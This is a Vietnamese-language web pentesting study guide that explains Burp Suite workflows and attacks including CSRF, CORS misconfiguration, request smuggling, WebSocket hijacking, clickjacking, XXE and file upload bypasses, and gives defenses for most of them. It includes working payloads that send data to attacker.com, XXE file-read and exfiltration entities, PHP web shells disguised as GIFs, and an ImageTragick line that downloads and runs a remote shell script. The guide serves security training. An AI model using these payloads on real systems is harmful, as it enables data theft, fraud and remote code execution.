# Web Pentesting Deep Dive

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## 1. Burp Suite Advanced

### What – Burp Suite Professional là gì?
Burp Suite là web security testing platform toàn diện, chuẩn công nghiệp cho pentesters và bug bounty hunters.

### How – Burp Suite Workflow Nâng Cao

```
Burp Suite Core Workflow:
1. Proxy → Intercept → Modify requests/responses
2. Target → Site Map → crawl application structure
3. Scanner → active scan → find vulnerabilities
4. Repeater → manual testing → iterate on findings
5. Intruder → fuzzing / brute force
6. Decoder → encode/decode (base64, URL, hex, gzip)
7. Comparer → diff 2 responses
8. Collaborator → out-of-band (SSRF, blind XSS, XXE)
```

```
Burp Intruder Attack Types:
├── Sniper     : 1 payload list, 1 position tại một thời điểm
├── Battering  : 1 payload, tất cả positions đồng thời
├── Pitchfork  : multiple lists, 1 payload mỗi position (parallel)
└── Cluster Bomb: multiple lists, all combinations (Cartesian product)

Dùng Intruder cho:
- Brute force login (Sniper: username+password)
- IDOR discovery (Sniper: thay IDs)
- Parameter fuzzing (Sniper: test payloads)
- Credential stuffing (Pitchfork: username:password pairs)
```

```python
# Burp Extension với Python (Jython):
# ~/.burp/extensions/custom_scanner.py

from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Custom SQL Scanner")
        callbacks.registerScannerCheck(self)
        self._stdout = PrintWriter(callbacks.getStdout(), True)

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        payloads = ["'", "1' OR '1'='1", "' OR 1=1--"]
        issues = []

        for payload in payloads:
            # Inject payload
            request = insertionPoint.buildRequest(
                self._helpers.stringToBytes(payload)
            )
            response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), request
            )

            # Check for SQL errors
            responseStr = self._helpers.bytesToString(
                response.getResponse()
            )
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-",
                "PostgreSQL", "Microsoft SQL"
            ]
            for error in sql_errors:
                if error in responseStr:
                    issues.append(self._createIssue(
                        response, payload, error
                    ))

        return issues if issues else None
```

---

## 2. CSRF (Cross-Site Request Forgery)

### What – CSRF là gì?
CSRF buộc browser của nạn nhân gửi request đến site đang đăng nhập mà không có sự chấp thuận. Khai thác session cookies được gửi tự động.

### How – CSRF Attack

```html
<!-- Attacker.com: evil page -->
<!-- Scenario: victim đang logged in vào bank.com -->

<!-- Simple GET CSRF (nếu bank dùng GET cho actions) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">
<!-- → Khi victim load trang → browser gửi request với session cookie →
     bank thực hiện transfer! -->

<!-- POST CSRF via form auto-submit -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker@evil.com">
    <input name="amount" value="99999">
    <!-- Session cookie tự động đính kèm -->
  </form>
</body>
</html>

<!-- JSON CSRF (nếu server không check Content-Type) -->
<form action="https://api.target.com/user/email" method="POST"
      enctype="text/plain">
  <!-- trick: name+value = valid JSON body -->
  <input name='{"email":"attacker@evil.com","z":"' value='"}'>
  <!-- → body: {"email":"attacker@evil.com","z":"="} -->
</form>

<!-- CSRF với fetch (SameSite=None hoặc không có SameSite) -->
<script>
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',    // gửi cookies
  body: JSON.stringify({to: 'attacker', amount: 99999}),
  headers: {'Content-Type': 'application/json'}
});
</script>
```

### How – CSRF Defense & Bypass

```python
# Defense 1: CSRF Token (Synchronizer Token Pattern)
# Server generate random token, client phải gửi lại
import secrets
session['csrf_token'] = secrets.token_hex(32)

# HTML form:
# <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">

# Verify on server:
def verify_csrf(request):
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        abort(403, "CSRF validation failed")

# Defense 2: SameSite Cookie
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
# Strict: browser KHÔNG gửi cookie trong cross-site requests
# Lax: gửi trong navigation (link click), không trong POST/AJAX

# Defense 3: Double Submit Cookie
# Set CSRF token trong cookie VÀ request body
# → Cross-origin không đọc được cookie → không thể forge

# Defense 4: Custom Request Header
# Origin header hoặc custom header (X-Requested-With)
# → Cross-origin form không thể set custom headers

# Bypass techniques:
# 1. Subdomain XSS → set cookie từ subdomain → bypass SameSite=Lax
# 2. CORS misconfiguration → JS đọc CSRF token từ response
# 3. Clickjacking + CSRF → user click button trên attacker frame
# 4. Old browser không support SameSite
# 5. null origin CORS: iframe sandbox → request với Origin: null
#    nếu server allow null origin → CSRF bypass
```

---

## 3. CORS Misconfiguration

### How – CORS Attacks

```javascript
// Vulnerable CORS: reflect Origin header
// Request: Origin: https://evil.com
// Response: Access-Control-Allow-Origin: https://evil.com
//           Access-Control-Allow-Credentials: true

// Attack: steal private data
fetch('https://api.target.com/user/private-data', {
  credentials: 'include'   // gửi cookies
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
// → Nếu CORS allow evil.com + credentials → data bị đánh cắp

// CORS bypass patterns:
// 1. Origin reflection: server accept bất kỳ origin
//    Test: Origin: null → response có null? → vulnerable
//    Test: Origin: https://targetsite.com.evil.com → accepted? → prefix match bug

// 2. Null origin (iframe sandbox):
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src='data:text/html,<script>
    fetch("https://api.target.com/sensitive", {credentials:"include"})
    .then(r=>r.text())
    .then(d=>location="https://attacker.com/?d="+d)
  </script>'>
</iframe>
// → Origin: null → nếu server allow null → data leak

// Phòng thủ:
// - Strict origin whitelist (không reflect arbitrary Origins)
// - Không dùng Access-Control-Allow-Origin: * với credentials
# CORS Policy:
response.headers['Access-Control-Allow-Origin'] = 'https://myapp.com'
response.headers['Access-Control-Allow-Credentials'] = 'true'
# ✗ KHÔNG:
response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin')
```

---

## 4. HTTP Request Smuggling

### What – Request Smuggling là gì?
Khai thác bất đồng giữa front-end proxy và back-end server về cách parse HTTP request boundaries, cho phép "smuggle" request ẩn.

### How – CL.TE và TE.CL

```http
# CL.TE: Front-end dùng Content-Length, Back-end dùng Transfer-Encoding

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# Front-end đọc CL=13 bytes → gửi toàn bộ đến backend
# Back-end đọc chunked: chunk size 0 = end → xử lý đến đó
# "SMUGGLED" chờ trong buffer → prefix của request TIẾP THEO!

# TE.CL: Front-end dùng TE, Back-end dùng CL
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Front-end đọc chunked → đến "0\r\n\r\n" = full request
# Back-end đọc CL=3 → chỉ đọc "8\r\n" → "SMUGGLED\r\n0\r\n\r\n" trong buffer

# Tấn công: bypass access control
# Nếu /admin chỉ accessible từ localhost:
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Forwarded-For: 127.0.0.1
Content-Length: 100

x=
# → Smuggled GET /admin → processed by backend as if from localhost → 200 OK!
```

```bash
# Test với HTTP Request Smuggler (Burp extension)
# Hoặc manual với Python:
import socket

def smuggle(host, port):
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n"
        b"0\r\n\r\n"
        b"X"
    )
    s = socket.socket()
    s.connect((host, port))
    s.sendall(payload)
    print(s.recv(4096))
    s.close()
```

---

## 5. WebSocket Security

### How – WebSocket Attacks

```javascript
// WebSocket không có SOP (Same-Origin Policy) như HTTP!
// WebSocket handshake là HTTP → có thể cross-origin nếu server không check Origin

// Attack 1: Cross-Site WebSocket Hijacking (CSWSH)
// (tương tự CSRF nhưng với WebSocket)
var ws = new WebSocket('wss://bank.com/ws');
// Browser tự động gửi cookies → nếu server không verify Origin → session hijacked

ws.onmessage = function(event) {
    fetch('https://attacker.com/steal?msg=' + encodeURIComponent(event.data));
};
ws.onopen = function() {
    ws.send('{"action": "getBalance"}');
};

// Attack 2: WebSocket message manipulation (nếu dùng Burp)
// Intercept WebSocket messages trong Burp → modify → send
// Ví dụ: {"amount": 100} → {"amount": 0.01}

// Attack 3: WebSocket injection (input không được sanitize)
// Nếu server broadcast messages đến tất cả clients:
ws.send("<script>alert(1)</script>");
// → Stored XSS thông qua WebSocket

// Phòng thủ:
// Server-side:
app.get('/ws', (req, res) => {
    const origin = req.headers.origin;
    if (!ALLOWED_ORIGINS.includes(origin)) {
        res.status(403).end();
        return;
    }
    upgradeToWebSocket(req, res);
});

// Token authentication trong WebSocket:
var ws = new WebSocket('wss://bank.com/ws?token=' + authToken);
// Server verify token trong handshake
```

---

## 6. Clickjacking

### How – Clickjacking Attack

```html
<!-- Attacker page: iframe target site, position button chính xác bên dưới -->
<style>
  iframe {
    position: absolute;
    width: 600px;
    height: 400px;
    opacity: 0.1;         /* transparent → không thấy */
    z-index: 2;
  }
  .decoy-button {
    position: absolute;
    top: 200px;           /* align với target button */
    left: 300px;
    z-index: 1;
  }
</style>

<div class="decoy-button">Click để nhận giải thưởng!</div>
<iframe src="https://bank.com/transfer?to=attacker&confirm=true"></iframe>

<!-- Victim click "giải thưởng" → thực ra click nút "Confirm Transfer" trong iframe
     → bank transfer tiền cho attacker -->

<!-- Phòng thủ:
     X-Frame-Options: DENY
     hoặc: X-Frame-Options: SAMEORIGIN
     hoặc CSP: frame-ancestors 'none'
              frame-ancestors 'self'
              frame-ancestors https://trusted.com -->

# Check với curl:
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"

# Frame busting JS (kém hơn headers):
if (top !== self) { top.location = self.location; }
# → Có thể bypass với sandbox attribute: <iframe sandbox="allow-forms allow-scripts">
```

---

## 7. XXE (XML External Entity)

### How – XXE Attack

```xml
<!-- Vulnerable endpoint nhận XML input -->
<!-- Normal request: -->
<?xml version="1.0"?>
<user>
  <name>John</name>
</user>

<!-- XXE: đọc local file -->
<?xml version="1.0" DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>   <!-- Entity expand → nội dung /etc/passwd -->
</user>

<!-- XXE: SSRF (internal service) -->
<?xml version="1.0" DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user><name>&xxe;</name></user>

<!-- XXE: Out-of-band (blind) - data exfiltration qua DNS -->
<?xml version="1.0" DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?file=%file;'>">
  %eval;
  %exfil;
]>
<user><name>test</name></user>

<!-- Phòng thủ: Java -->
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Disable external entities
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Python (lxml):
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

---

## 8. File Upload Vulnerabilities

### How – File Upload Bypass

```
Server validation layers:
├── Client-side: JS check extension → easily bypassed (disable JS)
├── Server-side extension check: .php .asp → bypass:
│   ├── Double extension: shell.php.jpg
│   ├── Case variation: shell.PHP, shell.Php
│   ├── NULL byte: shell.php%00.jpg (PHP < 5.4)
│   ├── Less known extensions: .phtml, .php3, .php4, .php5, .phar
│   └── Alternative extensions: .asp → .asa, .cer, .aspx
├── MIME type check (Content-Type header): forged in Burp
├── Magic bytes check: đọc first bytes của file
│   JPG: FF D8 FF → upload file bắt đầu với FF D8 FF sau đó chứa code
└── Image processing: GIF89a;<? system($_GET['cmd']); ?> → valid GIF + PHP
```

```python
# Bypass MIME + Magic bytes:
# File content = GIF header + PHP payload
# GIF89a
# <script language="php">system($_GET['cmd']);</script>

# Multipart form bypass
# Content-Type: image/jpeg (giả)
# Content: thực ra là PHP code

# Upload shell.php với Content-Type: image/jpeg → server accept
# Tìm upload path → execute: /uploads/shell.php?cmd=id

# ImageMagick attack (ImageTragick, CVE-2016-3714):
# Tạo file "shell.mvg" với content:
# push graphic-context
# viewbox 0 0 640 480
# fill 'url(https://"|id; wget https://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh")'
# pop graphic-context
# Khi ImageMagick resize → execute shell

# Phòng thủ:
# 1. Rename file trên server (random UUID)
# 2. Store files ngoài web root
# 3. Serve qua CDN/S3 (không execute)
# 4. Whitelist extensions + MIME + magic bytes (double check)
# 5. Scan với antivirus trước khi serve
# 6. Chạy image processing trong sandbox
```

---

### Compare – Web Vulnerability Scanning Tools

| Tool | Type | Speed | False Positive | Best For |
|------|------|-------|---------------|---------|
| Burp Suite Pro | Proxy + Scanner | Medium | Low | Manual + automated |
| OWASP ZAP | Proxy + Scanner | Medium | Medium | Open source, CI/CD |
| Nuclei | Template scanner | Fast | Low (templates) | Bug bounty, recon |
| Nikto | Web scanner | Fast | High | Quick server checks |
| SQLMap | SQL Injection | Slow | Very Low | Targeted SQLi testing |

### Trade-offs
- Active scanning trong production: tìm vulns nhưng có thể trigger alerts, disrupt services, ghi vào audit logs → dùng staging
- CSRF tokens vs SameSite: tokens reliable nhưng cần implementation; SameSite còn có edge cases với older browsers
- Request smuggling: rất nguy hiểm nhưng cần đúng điều kiện (front-end + back-end với khác nhau parsing)

### Real-world Usage
```bash
# Bug bounty recon flow:
# 1. Gather URLs
gau target.com | grep -v "\.js$\|\.css$\|\.png$" > urls.txt
waybackurls target.com >> urls.txt

# 2. Find parameters
cat urls.txt | grep "?" | sort -u > params.txt

# 3. Test XSS với dalfox
cat params.txt | dalfox pipe --skip-mining-all

# 4. Test SSRF với Collaborator
cat params.txt | grep -E "url=|path=|redirect=|next=|link=" | \
  while read url; do
    curl -s "$url=https://collaborator.burpcollaborator.net/"
  done

# 5. Nuclei scan
nuclei -l urls.txt -t nuclei-templates/ -severity high,critical

# 6. Directory fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403 -fc 404 -t 50
```

### Ghi chú – Chủ đề tiếp theo
> API Security – REST API attacks, GraphQL introspection/injection, JWT attacks deep dive, OAuth 2.0 flows và vulnerabilities

---

*Cập nhật lần cuối: 2026-05-06*
